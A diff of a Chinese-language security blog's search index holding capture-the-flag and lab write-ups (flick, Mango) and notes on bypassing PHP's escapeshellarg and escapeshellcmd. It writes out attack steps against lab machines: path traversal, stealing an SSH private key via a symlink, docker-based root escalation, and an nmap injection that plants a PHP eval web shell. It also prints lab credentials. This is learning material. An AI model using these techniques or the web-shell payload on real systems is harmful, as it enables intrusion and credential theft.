@@ -4860,6 +4860,146 @@
 ]]></content>
   </entry>
   <entry>
+    <title>flick</title>
+    <url>/2020/09/25/fb84x0/</url>
+    <content><![CDATA[<p>nmap 扫描端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601016774447-e529d7b4-4366-4b46-8c39-2011354e2b97.png#align=left&display=inline&height=441&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1015&size=192062&status=done&style=none&width=587" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>当使用 ssh 去连接的时候又一长串的 \x 十六进制的字符串</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601016958668-277af3ce-42d5-4acf-bdbf-adb450222d4c.png#align=left&display=inline&height=537&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=825&size=204789&status=done&style=none&width=581" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在转成字符串然后解码多次 base64 之后出现了一串不知道啥意思的字符串 tabupJievas8Knoj</p>
+<p>使用 nc 去连接一下 8881 端口，要求输入一个 password，输入之前转出来的那串，结果成功了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601017480553-6992062a-0264-41df-af29-202575a9581f.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=203&originWidth=1126&size=227772&status=done&style=none&width=737" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后再扫描端口就能扫到 80 端口了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601018773902-29497ff3-87b8-4fdd-854d-ec9d1120333b.png#align=left&display=inline&height=441&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=995&size=171161&status=done&style=none&width=610" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>有个登录页面，但是没有测出来 sql 注入，旁边有个提示说是个 demo，然后爆破出来 demo/demo123 的账号密码</p>
+<p>通过 cookie laravel_session 可以知道这是个 Laravel 的框架，登录后存在文件上传，但是文件名是随机编码的，没法解析<br>那些图片可以下载下来，有个 filename 的参数，然后发现过滤掉了 <code>../</code><br>使用 download?filename=…/./public/index.php（双写绕过）可以把 php 文件下载下来<br>另外还有它的数据库文件 ../app/database/production.sqlite 下载下来用 navicat 打开</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601022567982-4eb08ac8-72c0-4774-9ba5-87054f94c91c.png#align=left&display=inline&height=287&margin=%5Bobject%20Object%5D&name=image.png&originHeight=375&originWidth=958&size=58627&status=done&style=stroke&width=732" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>保存下这些账号密码，然后去 shh 登录一下试试（那些 password 是明文存储的）<br>dean/FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA<br>登录成功了！</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601022920532-263ef207-e526-4544-b5d2-ec10a14fb9f2.png#align=left&display=inline&height=292&margin=%5Bobject%20Object%5D&name=image.png&originHeight=464&originWidth=895&size=504225&status=done&style=none&width=564" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>目录下有个 message.txt</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601023325420-f3bf2fe7-a3a1-4cd4-84e7-c51d52a24662.png#align=left&display=inline&height=223&margin=%5Bobject%20Object%5D&name=image.png&originHeight=447&originWidth=1466&size=106323&status=done&style=stroke&width=733" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>通过同一目录下的 read_docker 来读取文件，他会自己在后面加上 /Dockerfile</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601023408306-bb9b00e6-4e61-4c3f-b4bc-e33def7cc2f5.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=485&originWidth=1452&size=897213&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>那我们可以通过软链接把 robin 的密钥跟 Dockerfile 链接起来<br><code>ln -s /home/robin/.ssh/id_rsa Dockerfile</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601023979548-24d177ec-5e0a-40d8-b0c8-cc5ef7f87988.png#align=left&display=inline&height=503&margin=%5Bobject%20Object%5D&name=image.png&originHeight=761&originWidth=786&size=736415&status=done&style=none&width=520" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>保存 i 下来，然后通过这个密钥登录 robin（注意文件权限别太高 600 就行，不然不能登录）<br><code>ssh -i 1.rsa robin@192.168.149.200</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601024275165-b4b68df6-8103-40f0-acf3-8c68eb477e34.png#align=left&display=inline&height=551&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=906&size=781017&status=done&style=none&width=655" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>里面有 docker</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601026082114-ed2fdced-fbf8-4539-bba4-844b6eb1adaf.png#align=left&display=inline&height=265&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=1141&size=598166&status=done&style=none&width=651" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后给一个 ubuntu 镜像挂载 /root/ 目录，想用哪个挂在哪个<br><code>docker run -v /root:/root/ -it ubuntu</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601025961992-d0244ddc-e7d7-451f-8e70-022013f92a40.png#align=left&display=inline&height=73&margin=%5Bobject%20Object%5D&name=image.png&originHeight=100&originWidth=900&size=107912&status=done&style=none&width=658" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601026044098-dba4dfa5-3648-49e4-95e2-0ce91cb0c005.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=289&originWidth=1304&size=465425&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>通过 sudo -l 可以发现 /opt/start_apache/restart.sh 下面的不需要密码就可以 sudo 运行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601026293874-27d5fddd-c81d-41f3-a3d0-a47e77e34c6d.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&name=image.png&originHeight=148&originWidth=1119&size=220016&status=done&style=none&width=704" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>那可以直接挂载 /opt 到 docker 然后改一下 /opt/start_apache/restart.sh<br>然后 sudo /opt/start_apache/restart.sh 就可以拿到 root 权限了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601026513333-d434353b-6ad1-41b9-9702-5ba47ce3ac15.png#align=left&display=inline&height=176&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=1882&size=892392&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+]]></content>
+  </entry>
+  <entry>
     <title>Me-and-My-Girlfriend-1</title>
     <url>/2020/06/01/ft0lvd/</url>
     <content><![CDATA[<p>nmap  扫描一下 nmap -A -p- 192.168.149.172</p>
@@ -7980,7 +8120,6 @@
 <h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="PHP-字符串解析特性"><a href="#PHP-字符串解析特性" class="headerlink" title="PHP  字符串解析特性"></a>PHP  字符串解析特性</h3><p>当 php  查询字符串进行解析的时候会将某些字符删除或用下划线代替<br>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">foreach</span>(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"&#123;chr&#125;foo_bar"</span>,</span><br><span class="line">            <span class="string">"foo&#123;chr&#125;bar"</span>,</span><br><span class="line">            <span class="string">"foo_bar&#123;chr&#125;"</span></span><br><span class="line">        ] <span class="keyword">as</span> $k =&gt; $arg) &#123;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">255</span>;$i++) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"["</span>.$arg.<span class="string">"] check "</span>.bin2hex(chr($i)).<span class="string">""</span>;</span><br><span class="line">                parse_str(str_replace(<span class="string">"&#123;chr&#125;"</span>,chr($i),$arg).<span class="string">"=bla"</span>,$o);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($o[<span class="string">"foo_bar"</span>])) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">                    <span class="keyword">echo</span> $arg.<span class="string">" -&gt; "</span>.bin2hex(chr($i)).<span class="string">" ("</span>.chr($i).<span class="string">")\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\033[999D\033[K\r"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><a href="">[RoarCTF 2019]Easy Calc</a></p>
 <p>这道题目中 WAF  的存在使得没法给  num  传字符，但是如果在  num 前面加上个空格，那样 WAF 在检测的时候就不会检测到 num  这个参数，但是 PHP 在解析的时候会把空格删掉，这样就可以命令执行了</p>
 <h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p>%0a</p>
 <h3 id="回车符"><a href="#回车符" class="headerlink" title="回车符"></a>回车符</h3><p>%0d</p>
@@ -8008,6 +8147,52 @@
             </figure>
 
 <p>可以直接 cat <code>ls</code><br>把反引号内的命令输出作为输入给 cat</p>
+<h3 id="escapeshellarg-amp-escapeshellcmd"><a href="#escapeshellarg-amp-escapeshellcmd" class="headerlink" title="escapeshellarg&amp;escapeshellcmd"></a>escapeshellarg&amp;escapeshellcmd</h3><p><strong>escapeshellarg</strong><br>**<br>字符串增加一个单引号并且能引用或者转码任何已经存在的单引号<br>string escapeshellarg(string $arg)</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600691830489-2dced7cf-d0f2-4b08-954d-4821108fb78e.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=397&originWidth=1305&size=83751&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在执行命令的时候，如果外面包裹的是双引号，是可以正常的执行的，要是能让他双引号拼接的话说不定…</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600690039198-8adae215-8168-4349-a9bb-b42970d8b61c.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&name=image.png&originHeight=381&originWidth=538&size=226376&status=done&style=none&width=366" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><strong>escapeshellcmd</strong></p>
+<p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义<br>在 &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF 前插入反斜线</p>
+<p>转义了 <code>;</code> 实际执行的命令是 <code>ls &#39;/root;&#39; &#39;id&#39;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600692854905-c729ebd5-7444-479b-bede-b8cfa1f3c389.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1277&size=85742&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>两个结合起来，如果先用了 escapeshellarg，后用了 escapeshellcmd：<br><strong>例题：<a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool" target="_blank" rel="noopener">[BUUCTF 2018]Online Tool</a></strong></p>
+<p>就看这些</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">	$host = escapeshellarg($host);</span><br><span class="line">	$host = escapeshellcmd($host);</span><br><span class="line">	<span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>想通过 nmap 的 -oG 把命令写入一个文件里面<br><code>&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;</code></p>
+<p>首先经过 escapeshellarg，处理之后的样子 ↓<br>‘’&#39;‘ <?php eval($_POST["v"]);?> -oG shell.php ‘&#39;‘’</p>
+<p>然后经过  escapeshellcmd 转义后：<br>‘’\‘’ &lt;?php eval($_POST[“v”]);?&gt; -oG shell.php ‘\‘’’</p>
+<p>然后实际上他就是<br>nmap -T5 -sT -Pn –host-timeout 2 -F  \ <?php eval($_POST["v"]);?> -oG shell.php \</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600696532901-6c29a943-65d3-46cc-aaf8-6616e22442f5.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=217&originWidth=1141&size=36354&status=done&style=none&width=706" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>ps.这个题 flag 在根目录：/flag</p>
 <h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><h3 id="延时"><a href="#延时" class="headerlink" title="延时"></a>延时</h3><p>比如：ls|sleep 3<br>延时 3 秒，就说明执行了命令</p>
 <h3 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h3><h3 id="DNS-请求"><a href="#DNS-请求" class="headerlink" title="DNS 请求"></a>DNS 请求</h3><p>CEYE</p>
 <h2 id="可控字符串长度受限"><a href="#可控字符串长度受限" class="headerlink" title="可控字符串长度受限"></a>可控字符串长度受限</h2><h3 id="15-个可控字符"><a href="#15-个可控字符" class="headerlink" title="15 个可控字符"></a>15 个可控字符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(_FILE_);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> strlen($_GET[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">'too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -14838,6 +15023,78 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Mango</title>
+    <url>/2020/03/09/tp9x81/</url>
+    <content><![CDATA[<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583758313592-08a24649-f41c-4ef2-b1dc-2f323f1d191b.png#align=left&display=inline&height=422&name=image.png&originHeight=844&originWidth=1538&size=214940&status=done&style=none&width=769" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>不知道为啥，做了这几个里面这个超级卡，基本没啥反应的那种</p>
+<p>nmap 扫描端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583759782675-676f61ef-2b1c-40e0-8344-1730e6cecc40.png#align=left&display=inline&height=405&name=image.png&originHeight=573&originWidth=901&size=137041&status=done&style=none&width=637" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>同时发现了一个网址：在 443  端口  staging-order.mango.htb</p>
+<p>vim /etc/hosts，把 10.10.10.162   staging-order.mango.htb</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760729323-be38d915-17dd-4023-82a1-58babc5492e5.png#align=left&display=inline&height=195&name=image.png&originHeight=208&originWidth=596&size=32971&status=done&style=none&width=560" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问得到一个登录框</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760814048-7dc4a712-8a71-4404-b6b8-e57ac7eefe72.png#align=left&display=inline&height=328&name=image.png&originHeight=371&originWidth=362&size=16557&status=done&style=stroke&width=320" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><strong>nosql 注入</strong></p>
+<p>先了解一些 mangodb  在  web  知识库补充</p>
+<p>有个专门爆破用户名和密码的脚本：<a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" target="_blank" rel="noopener">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583973993862-b26ea0b0-e4b4-45b2-bd62-3b38c74a97c0.png#align=left&display=inline&height=286&name=image.png&originHeight=474&originWidth=903&size=80564&status=done&style=none&width=544" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>太慢了，就直接用大佬的结果了<br>mango：h3mXK8RhU~f{]f5H<br>admin：t9KcS3&gt;!0B#2</p>
+<p>可以直接用  ssh  登录到  ssh <a href="mailto:mango@10.10.10.162">mango@10.10.10.162</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583974501839-3686e7f7-f36a-46e9-a8e2-cc9525bd76d4.png#align=left&display=inline&height=502&name=image.png&originHeight=726&originWidth=786&size=147809&status=done&style=none&width=543" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>su admin  切换到  admin  用户</p>
+<p>在  admin 的目录下面找到  user.txt</p>
+<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null<br>可以发现  jjs  是用  root  运行的</p>
+<p>运行  jjs<br>这样输入：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var filename = "/root/root.txt";</span><br><span class="line">var content = new java.lang.String(</span><br><span class="line">                   java.nio.file.Files.readAllBytes(</span><br><span class="line">                     java.nio.file.Paths.get(filename)</span><br><span class="line">                   )</span><br><span class="line">                 );</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+
+<p>就可以拿到  root.txt</p>
+<p>实在是佩服这个网，连不上，不截图了，也没发交  flag  了 Orz</p>
+<p>参考：<a href="https://rmccarth.info/post/htb/mango/" target="_blank" rel="noopener">https://rmccarth.info/post/htb/mango/</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>DC-4</title>
     <url>/2020/04/06/ttamkh/</url>
     <content><![CDATA[<p>nmap 扫描端口</p>
@@ -19412,78 +19669,6 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install       \</span><br><span class="line">    cmake                  \</span><br><span class="line">    build-essential        \</span><br><span class="line">    libboost-dev           \</span><br><span class="line">    libqt5xmlpatterns5-dev \</span><br><span class="line">    qtbase5-dev            \</span><br><span class="line">    qt5-default            \</span><br><span class="line">    libqt5svg5-dev         \</span><br><span class="line">    libgraphviz-dev        \</span><br><span class="line">    libcapstone-dev        \</span><br><span class="line">    pkg-config</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/eteran/edb-debugger.git</span><br><span class="line"><span class="built_in">cd</span> edb-debugger</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/usr/<span class="built_in">local</span>/ ..</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
 
 <p>安装完成后直接在命令行里使用  edb 运行</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Mango</title>
-    <url>/2020/03/09/tp9x81/</url>
-    <content><![CDATA[<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583758313592-08a24649-f41c-4ef2-b1dc-2f323f1d191b.png#align=left&display=inline&height=422&name=image.png&originHeight=844&originWidth=1538&size=214940&status=done&style=none&width=769" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>不知道为啥，做了这几个里面这个超级卡，基本没啥反应的那种</p>
-<p>nmap 扫描端口</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583759782675-676f61ef-2b1c-40e0-8344-1730e6cecc40.png#align=left&display=inline&height=405&name=image.png&originHeight=573&originWidth=901&size=137041&status=done&style=none&width=637" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>同时发现了一个网址：在 443  端口  staging-order.mango.htb</p>
-<p>vim /etc/hosts，把 10.10.10.162   staging-order.mango.htb</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760729323-be38d915-17dd-4023-82a1-58babc5492e5.png#align=left&display=inline&height=195&name=image.png&originHeight=208&originWidth=596&size=32971&status=done&style=none&width=560" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>访问得到一个登录框</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583760814048-7dc4a712-8a71-4404-b6b8-e57ac7eefe72.png#align=left&display=inline&height=328&name=image.png&originHeight=371&originWidth=362&size=16557&status=done&style=stroke&width=320" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p><strong>nosql 注入</strong></p>
-<p>先了解一些 mangodb  在  web  知识库补充</p>
-<p>有个专门爆破用户名和密码的脚本：<a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" target="_blank" rel="noopener">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583973993862-b26ea0b0-e4b4-45b2-bd62-3b38c74a97c0.png#align=left&display=inline&height=286&name=image.png&originHeight=474&originWidth=903&size=80564&status=done&style=none&width=544" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>太慢了，就直接用大佬的结果了<br>mango：h3mXK8RhU~f{]f5H<br>admin：t9KcS3&gt;!0B#2</p>
-<p>可以直接用  ssh  登录到  ssh <a href="mailto:mango@10.10.10.162">mango@10.10.10.162</a></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1583974501839-3686e7f7-f36a-46e9-a8e2-cc9525bd76d4.png#align=left&display=inline&height=502&name=image.png&originHeight=726&originWidth=786&size=147809&status=done&style=none&width=543" alt="image.png" title="">
-                </div>
-                <div class="image-caption">image.png</div>
-            </figure>
-
-<p>su admin  切换到  admin  用户</p>
-<p>在  admin 的目录下面找到  user.txt</p>
-<p>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null<br>可以发现  jjs  是用  root  运行的</p>
-<p>运行  jjs<br>这样输入：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">var filename = "/root/root.txt";</span><br><span class="line">var content = new java.lang.String(</span><br><span class="line">                   java.nio.file.Files.readAllBytes(</span><br><span class="line">                     java.nio.file.Paths.get(filename)</span><br><span class="line">                   )</span><br><span class="line">                 );</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
-
-<p>就可以拿到  root.txt</p>
-<p>实在是佩服这个网，连不上，不截图了，也没发交  flag  了 Orz</p>
-<p>参考：<a href="https://rmccarth.info/post/htb/mango/" target="_blank" rel="noopener">https://rmccarth.info/post/htb/mango/</a></p>
 ]]></content>
   </entry>
 </search>
